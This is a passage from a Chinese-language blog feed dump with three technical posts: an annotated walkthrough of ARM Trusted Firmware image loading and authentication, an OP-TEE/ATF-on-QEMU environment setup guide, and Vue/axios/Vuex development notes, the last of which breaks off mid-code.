class="line">if (img_desc-&gt;authenticated_data[i].type_desc == NULL) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 通过镜像解析器从镜像中提取内容 */</span><br><span class="line">rc = img_parser_get_auth_param(img_desc-&gt;img_type,</span><br><span class="line">img_desc-&gt;authenticated_data[i].type_desc,</span><br><span class="line">img_ptr, img_len, &amp;param_ptr, &amp;param_len);</span><br><span class="line">return_if_error(rc);</span><br><span class="line"></span><br><span class="line">/* 异常检查</span><br><span class="line">   防止从镜像中解析出的数据字节数大于镜像描述符中的字节数</span><br><span class="line">   出现内存访问溢出 */</span><br><span class="line">if (param_len &gt; img_desc-&gt;authenticated_data[i].data.len) &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 把解析出的内容拷贝到镜像描述符中，便于解析下一级BL */</span><br><span class="line">memcpy((void *)img_desc-&gt;authenticated_data[i].data.ptr,</span><br><span class="line">(void *)param_ptr, param_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 标记镜像以认证过 */</span><br><span class="line">auth_img_flags[img_desc-&gt;img_id] |= IMG_FLAG_AUTHENTICATED;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="bl2_image_load_v2c"><a class="markdownIt-Anchor" href="#bl2_image_load_v2c">#</a> BL2_image_load_v2.c</h4><p>该函数用来加载 bl3x 的 image 到 RAM 中，返回一个具有 image 入口信息的变量。smc handle 根据该变量跳转到 bl31 进行执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="type">entry_point_info_t</span> *<span class="title function_">bl2_load_images</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bl_params_t</span> *bl2_to_next_bl_params;</span><br><span class="line"><span class="type">bl_load_info_t</span> *bl2_load_info;</span><br><span class="line"><span class="type">const</span> <span class="type">bl_load_info_node_t</span> *bl2_node_info;</span><br><span class="line"><span class="type">int</span> plat_setup_done = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get information about the images to load.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 获取bl3x image的加载和入口信息 */</span></span><br><span class="line">bl2_load_info = plat_get_bl_image_load_info();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查返回的bl2_load_info中的信息是否正确 */</span></span><br><span class="line">assert(bl2_load_info);</span><br><span class="line">assert(bl2_load_info-&gt;head);</span><br><span class="line">assert(bl2_load_info-&gt;h.type == PARAM_BL_LOAD_INFO);</span><br><span class="line">assert(bl2_load_info-&gt;h.version &gt;= VERSION_2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将bl2_load_info中的head变量的值赋值为bl2_node_info，即将bl31 image的入口信息传递給bl2_node_info变量 */</span></span><br><span class="line">bl2_node_info = bl2_load_info-&gt;head;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 进入loop循环， */</span></span><br><span class="line"><span class="keyword">while</span> (bl2_node_info) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Perform platform setup before loading the image,</span></span><br><span class="line"><span class="comment">* if indicated in the image attributes AND if NOT</span></span><br><span class="line"><span class="comment">* already done before.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 在加载特定的bl3x image到RAM之前先确定是否需要做平台的初始化 */</span></span><br><span class="line"><span class="keyword">if</span> (bl2_node_info-&gt;image_info-&gt;h.attr &amp; IMAGE_ATTRIB_PLAT_SETUP) &#123;</span><br><span class="line"><span class="keyword">if</span> (plat_setup_done) &#123;</span><br><span class="line">WARN(<span class="string">&quot;BL2: Platform setup already done!!\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INFO(<span class="string">&quot;BL2: Doing platform setup\n&quot;</span>);</span><br><span class="line">bl2_platform_setup();</span><br><span class="line">plat_setup_done = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 对bl3x image进行电子验签，如果通过则执行加载操作 */</span></span><br><span class="line"><span class="keyword">if</span> (!(bl2_node_info-&gt;image_info-&gt;h.attr &amp; IMAGE_ATTRIB_SKIP_LOADING)) &#123;</span><br><span class="line">INFO(<span class="string">&quot;BL2: Loading image id %d\n&quot;</span>, bl2_node_info-&gt;image_id);</span><br><span class="line">err = load_auth_image(bl2_node_info-&gt;image_id,</span><br><span class="line">bl2_node_info-&gt;image_info);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">ERROR(<span class="string">&quot;BL2: Failed to load image (%i)\n&quot;</span>, err);</span><br><span class="line">plat_error_handler(err);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INFO(<span class="string">&quot;BL2: Skip loading image id %d\n&quot;</span>, bl2_node_info-&gt;image_id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allow platform to handle image information. */</span></span><br><span class="line"><span class="comment">/* 可以根据实际需要更改，通过给定image ID来更改image的加载信息 */</span></span><br><span class="line">err = bl2_plat_handle_post_image_load(bl2_node_info-&gt;image_id);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">ERROR(<span class="string">&quot;BL2: Failure in post image load handling (%i)\n&quot;</span>, err);</span><br><span class="line">plat_error_handler(err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Go to next image */</span></span><br><span class="line">bl2_node_info = bl2_node_info-&gt;next_load_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get information to pass to the next image.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 获取下一个执行的Image的入口信息，并且将以后会被执行的image的入口信息组合成链表 ,t通过判断image des中的ep_info.h.attr的值是否为（EXECUTABLE|EP_FIRST_EX）来确定接下来第一个被执行的image*/</span></span><br><span class="line">bl2_to_next_bl_params = plat_get_next_bl_params();</span><br><span class="line">assert(bl2_to_next_bl_params);</span><br><span class="line">assert(bl2_to_next_bl_params-&gt;head);</span><br><span class="line">assert(bl2_to_next_bl_params-&gt;h.type == PARAM_BL_PARAMS);</span><br><span class="line">assert(bl2_to_next_bl_params-&gt;h.version &gt;= VERSION_2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Flush the parameters to be passed to next image */</span></span><br><span class="line">plat_flush_next_bl_params();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回下一个进入的image的入口信息,即bl31的入口信息 */</span></span><br><span class="line"><span class="keyword">return</span> bl2_to_next_bl_params-&gt;head-&gt;ep_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="四-分析结论"><a class="markdownIt-Anchor" href="#四-分析结论">#</a> 四、分析结论</h1><p>​结合 ATF 整个信任链条建立的流程图，我们了解到可信启动中的安全模块和可信机制，从作为信任根的 BL1 开始，逐步进行初始化和加载镜像，最后来到 BL33，后面就是 OS 了。</p><p>最后引用一张 ATF 的 UEFI 启动流程进行更直观展示：</p><p><img src="https://pic2.zhimg.com/80/v2-fac683117333c274fd22832772342d81_1440w.jpg" alt="img"></p><p>以上仅是对 ATF 可信启动机制的简要分析，而对于 ATF 的更深层次技术需要更多信息搜集和整理研究。</p><h1 id="五-参考文章"><a class="markdownIt-Anchor" href="#五-参考文章">#</a> 五、参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/391101179">https://zhuanlan.zhihu.com/p/391101179</a></p><p><a href="https://github.com/hardenedlinux/embedded-iot_profile/blob/master/docs/arm64/arm-trusted-firmware%E5%88%86%E6%9E%90.md">https://github.com/hardenedlinux/embedded-iot_profile/blob/master/docs/arm64/arm-trusted-firmware 分析.md</a></p><p><a href="https://blog.csdn.net/puyoupuyou/article/details/109506419?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2">https://blog.csdn.net/puyoupuyou/article/details/109506419?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2</a><sub>default</sub>BlogCommendFromBaidu<sub>Rate-15.topblog&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2</sub>default<sub>BlogCommendFromBaidu</sub>Rate-15.topblog&amp;utm_relevant_index=20</p>]]></content>
      
      
      <categories>
          
          <category> arm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于QEMU的OPTEE/ATF学习</title>
      <link href="/2022/04/10/OPTEE_ATF/"/>
      <url>/2022/04/10/OPTEE_ATF/</url>
      
        <content type="html"><![CDATA[<p>OPTEE/ATF</p><span id="more"></span><h1 id="环境安装问题"><a class="markdownIt-Anchor" href="#环境安装问题">#</a> 环境安装问题</h1><h2 id="ubuntu-2004-1910-or-1904出现libqtgui4-depends-libpng12-0-1213-4-but-it-is-not-installed"><a class="markdownIt-Anchor" href="#ubuntu-2004-1910-or-1904出现libqtgui4-depends-libpng12-0-1213-4-but-it-is-not-installed">#</a> Ubuntu 20.04, 19.10 or 19.04 出现 libqtgui4 : Depends: libpng12-0 (&gt;= 1.2.13-4) but it is not installed</h2><p>E: Unmet dependencies. Try ‘apt --fix-broken install’ with no packages (or specify a solution). 问题的解决方法：</p><p>Ubuntu 20.04, 19.10 或者 19.04 中，可以通过 PPA 安装 libpng，安装 PPA 及 libpng12-0 的命令如下。</p><h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:linuxuprising/libpng12</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libpng12-<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="opteeatf环境安装"><a class="markdownIt-Anchor" href="#opteeatf环境安装">#</a> OPTEE/ATF 环境安装</h1><blockquote><p>我的虚拟机是 Ubuntu18.04</p></blockquote><h2 id="一常规流程比较考验网速"><a class="markdownIt-Anchor" href="#一常规流程比较考验网速">#</a> （一）常规流程（比较考验网速）</h2><ol><li>安装必要依赖</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install android-tools-adb android-tools-fastboot autoconf \</span><br><span class="line">automake bc bison build-essential cscope curl device-tree-compiler \</span><br><span class="line">expect flex ftp-upload gdisk iasl libattr1-dev libc6:i386 libcap-dev \</span><br><span class="line">libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \</span><br><span class="line">libpixman-1-dev libssl-dev libstdc++6:i386 libtool libz1:i386 make \</span><br><span class="line">mtools netcat python-crypto python-serial python-wand unzip uuid-dev \</span><br><span class="line">xdg-utils xterm xz-utils zlib1g-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>创建 opentee 目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir open-tee//创建目录</span><br><span class="line">cd open-tee//切换到创建的目录</span><br><span class="line">repo init -u https://github.com/OP-TEE/manifest.git -m default_stable.xml --repo-url=https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/ -b 2.6.0 //初始化repo,使用清华的repo减少一些麻烦</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>打开.repo/manifest.xml，在 revision 后添加 clone-depth=“1”，因为一些 linux project,qemu project 太大，只克隆一层</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time repo sync -j8 -f</span><br></pre></td></tr></table></figure><ol start="4"><li>获取 toolchain</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build//切换到build目录</span><br><span class="line">make -f toolchain.mk toolchains//下载toolchain</span><br></pre></td></tr></table></figure><ol start="5"><li><p>开始编译使用 qemu 运行 OP-TEE 的工程</p><p>准备好 toolchain 和 source code 之后，下一步就是编译工程，具体操作如下：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build//切换到build目录</span><br><span class="line">make -f qemu.mk all//编译工程</span><br></pre></td></tr></table></figure><ol start="6"><li>启动 qemu</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build</span><br><span class="line">make -f qemu.mk run-only</span><br></pre></td></tr></table></figure><ol start="7"><li><p>运行 OP-TEE 和 linux</p><p>在 qemu 界面中输入字母 “c” 回车之后，就会启动两个 terminal，一个是 OP-TEE 的 terminal, 另外一个是 linux 的 terminal。</p></li></ol><h2 id="二使用搭建好的的optee"><a class="markdownIt-Anchor" href="#二使用搭建好的的optee">#</a> （二）使用搭建好的的 optee</h2><blockquote><p><a href="https://blog.csdn.net/chelseablue1905/article/details/85344941">https://blog.csdn.net/chelseablue1905/article/details/85344941</a></p></blockquote><p>注意在 build_qemu.sh 时会报错，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builddir/build/BUILD/qemu-2.11.0-rc1/util/memfd.c:40:12: error: static declaration of memfd_create follows non-static declaration</span><br></pre></td></tr></table></figure><p>按照发布的补丁：<a href="https://git.qemu.org/?p=qemu.git;a=commit;h=75e5b70e6b5dcc4f2219992d7cffa462aa406af0">https://git.qemu.org/?p=qemu.git;a=commit;h=75e5b70e6b5dcc4f2219992d7cffa462aa406af0</a></p><p>删除 qemu/util/memfd.c 中报错部分的 static 函数以及引用头文件重新编译即可</p><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="http://www.fredyblog.cn/index.php/2021/06/28/arm-atf-optee/">http://www.fredyblog.cn/index.php/2021/06/28/arm-atf-optee/</a></p><p><a href="https://icyshuai.blog.csdn.net/article/details/71499619">https://icyshuai.blog.csdn.net/article/details/71499619</a></p>]]></content>
      
      
      <categories>
          
          <category> qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue开发问题总结</title>
      <link href="/2022/03/07/vue%E5%BC%80%E5%8F%91%20(1)/"/>
      <url>/2022/03/07/vue%E5%BC%80%E5%8F%91%20(1)/</url>
      
        <content type="html"><![CDATA[<p>vue 开发中遇到的一些问题及解决方法</p><span id="more"></span><h1 id="一-前后端跨域接口实现"><a class="markdownIt-Anchor" href="#一-前后端跨域接口实现">#</a> 一、前后端跨域接口实现</h1><h2 id="1-安装axios插件并设置全局"><a class="markdownIt-Anchor" href="#1-安装axios插件并设置全局">#</a> 1、安装 axios 插件并设置全局</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios --save-dev</span><br></pre></td></tr></table></figure><p>安装完成后对 axios 进行全局调用，在 main.js 中设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$axios</span> = axios</span><br></pre></td></tr></table></figure><h2 id="2-设置跨域代理"><a class="markdownIt-Anchor" href="#2-设置跨域代理">#</a> 2、设置跨域代理</h2><p>在 config 文件夹的 index.js 文件中 (或者是在 vue.config.js 中），设置 proxy 模块代理，之后重启项目</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">  <span class="attr">port</span>: port,</span><br><span class="line">  <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">overlay</span>: &#123;</span><br><span class="line">    <span class="attr">warnings</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">errors</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// before: require(&#x27;./mock/mock-server.js&#x27;)</span></span><br><span class="line">  <span class="attr">proxy</span>: &#123;</span><br><span class="line">    [process.<span class="property">env</span>.<span class="property">VUE_APP_BASE_API</span>]: &#123; </span><br><span class="line">      <span class="attr">target</span>: <span class="string">&#x27;http://0.0.0.0:8000/&#x27;</span>, <span class="comment">// 用于本地调试</span></span><br><span class="line">      <span class="comment">// target: &#x27;&#x27;, // 用于生产环境</span></span><br><span class="line">      <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">        [<span class="string">&#x27;^&#x27;</span> + process.<span class="property">env</span>.<span class="property">VUE_APP_BASE_API</span>]: <span class="string">&#x27;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="3-发送请求"><a class="markdownIt-Anchor" href="#3-发送请求">#</a> 3、 发送请求</h2><p>在 src 的 views 文件夹中创建 test.vue 文件，在文件中进行编写，这里只介绍 js 部分，在 method 方法中设置接口，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">loopResult (data) &#123;</span><br><span class="line">     <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">     <span class="keyword">let</span> e;</span><br><span class="line">     self.<span class="property">axios</span>.<span class="title function_">get</span>(</span><br><span class="line">       <span class="string">&#x27;/index/start/&#x27;</span></span><br><span class="line">     ).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="comment">// 根据状态码判断是否跨域成功</span></span><br><span class="line">         <span class="keyword">if</span> (res.<span class="property">data</span>.<span class="property">recode</span> === <span class="number">2000</span>) &#123;</span><br><span class="line">           <span class="keyword">var</span> jsonObj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(res.<span class="property">data</span>));</span><br><span class="line">           <span class="comment">// 解析json数据</span></span><br><span class="line">           jsonObj  = jsonObj.<span class="property">data</span>;</span><br><span class="line">          </span><br><span class="line">             <span class="variable language_">console</span>.<span class="title function_">log</span>(self.<span class="property">tableData</span>[i].<span class="property">text_id</span>);</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="title function_">alert</span>(<span class="string">&#x27;获取数据失败&#x27;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     ).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">     &#125;);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>这样便可以调用 data 中声明的变量对应数据，从而在页面显示出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">page</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">offset</span>: <span class="number">10</span>,</span><br><span class="line">      <span class="attr">totalNum</span>: <span class="number">1000</span>,</span><br><span class="line">      <span class="attr">tableData</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以将异步方法封装成 spider.js, 如</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062312028.png" alt="image-20220306231244869"></p><p>在 request.js 中，可以改 VUE_APP_BASE_API 为想要的值</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062314260.png" alt="image-20220306231453092"></p><h1 id="二-动态表格实现"><a class="markdownIt-Anchor" href="#二-动态表格实现">#</a> 二、 动态表格实现</h1><p>在 vue 的 template 中引入 el-table，props 对应后端传来的 json 数组中元素的名称</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062317408.png" alt="image-20220306231741321"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062318159.png" alt="image-20220306231828087"></p><h1 id="三-vue-将数据存入vuex中以及从vuex中取出数据"><a class="markdownIt-Anchor" href="#三-vue-将数据存入vuex中以及从vuex中取出数据">#</a> 三、vue - 将数据存入 vuex 中以及从 vuex 中取出数据</h1><blockquote><p>转载自：<a href="https://juejin.cn/post/7025522047988006925#heading-8">https://juejin.cn/post/7025522047988006925#heading-8</a></p></blockquote><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。简单来说就是：应用遇到多个组件共享状态时，使用 vuex。</p><h2 id="vuex的五个核心概念"><a class="markdownIt-Anchor" href="#vuex的五个核心概念">#</a> vuex 的五个核心概念：</h2><ul><li>State：共享状态，vuex 的基本数据，用来存储变量，相当于组件 data 里的数据，只不过此时变成了全局变量。</li><li>Getter：基于 state 的派生状态，相当于组件中的 computed 中的属性。</li><li>Mutation：更改 vuex 中 store 共享状态的方法，通过提交 mutation 来去修改状态，进行同步操作数据，通常用于 action 获取异步数据，获取通过 commit 提交数据给 mutation，在 mutation 同步操作 state 中的数据。</li><li>action：支持异步操作，可用于异步获取请求中的数据，并将获取的数据同步 commit 提交给 mutation，实现 ajax 异步请求数据，mutation 将其数据同步到 state 中。</li><li>modules：模块化 vuex，为了方便后期对于项目的管理，可以让每一个模块拥有自己的 state、mutation、action、getters, 使得结构非常清晰，方便管理。</li></ul><p>优势和劣势有哪些？<br>优势主要就是可以全局共享数据，方法。方便统一管理<br>劣势的话，页面刷新后 state 的变量都会还原清空，不会像 cookies 一样持久性存储</p><p>页面刷新后 vuex 的 state 数据丢失怎么解决？<br>先说一下为什么会丢失呢？<br>因为 store 里的数据是保存在运行内存中的，当页面刷新时页面会重新加载 vue 实例，store 里面的数据就会被重新赋值</p><p>如何避免？<br>其实主要还是看使用的场景是怎样的，如果想某些数据持久性保留也可以搭配使用 cookies 或者 localStorage。比如一些登录的信息等。<br>比如请求拿到了登录信息后可以先存在 localStorage，将 state 里的变量值和 sessionStorage 里面的绑定，mutations 中修改的时候同时修改 state 和 localStorage。最后页面直接使用 vuex 中的变量。</p><h2 id="正式进入使用"><a class="markdownIt-Anchor" href="#正式进入使用">#</a> 正式进入使用</h2><p>vuex 的安装<br>打开终端，输入命令行 npm install vuex --save 进行下载 vuex</p><h3 id="vuex应用核心管理仓库-构建store"><a class="markdownIt-Anchor" href="#vuex应用核心管理仓库-构建store">#</a> vuex 应用核心管理仓库 构建 store</h3><p>这里新建 store 文件夹，创建一个 js 取名为 index.js，<br>在 index 里 ，通过将 state,mutations,actions,getters 引入到 store 中，并暴露出 store 对象。</p><p>下面为 index.js 的代码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  vuex最核心的管理对象 store</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 分别引入这四个文件  这四个文件的内容和用法在下面分别讲到</span></span><br><span class="line"><span class="keyword">import</span> state <span class="keyword">from</span> <span class="string">&#x27;./state&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> mutations <span class="keyword">from</span> <span class="string">&#x27;./mutations&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> actions <span class="keyword">from</span> <span class="string">&#x27;./actions&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> getters <span class="keyword">from</span> <span class="string">&#x27;./getters&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//声明使用插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"><span class="comment">//new 一个Vuex的对象,将state,mutation,action,getters配置到vuex的store中,方便管理数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;  </span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">  getters,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>挂载 store 到 vue 实例上<br> main.js 中</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="comment">// ..........</span></span><br><span class="line"><span 